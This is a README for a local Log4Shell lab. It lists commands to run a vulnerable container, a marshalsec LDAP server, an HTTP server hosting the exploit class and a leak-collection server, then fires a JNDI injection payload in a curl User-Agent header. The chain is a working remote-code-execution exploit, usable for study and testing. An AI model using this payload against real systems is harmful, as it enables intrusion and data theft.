# Log4Shell

## Execute Locally

Build and Run the docker container
```bash
docker build -t log4shell .
docker run -d --add-host=host.docker.internal:host-gateway -p 8080:8080 log4shell
```

Start the LDAP server
```bash
cd sim/
HNAME=$(hostname -I | awk '{print $1}') && java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://${HNAME}:8000/#Exploit"
```

Start the redirect HTTP server pointed to by the LDAP (Within the sim folder)
```bash
python3 -m http.server 8000
```

Start the server to receive and visualize the exploited information (Outside the sim folder)
```bash
python3 leak_server.py
```

Trigger the exploit
```bash
curl -H 'User-Agent: ${jndi:ldap://'"$(hostname -I | awk '{print $1}')"':1389/Exploit}' localhost:8080
```

## Credits
https://github.com/leonjza/log4jpwn  
https://github.com/mbechler/marshalsec
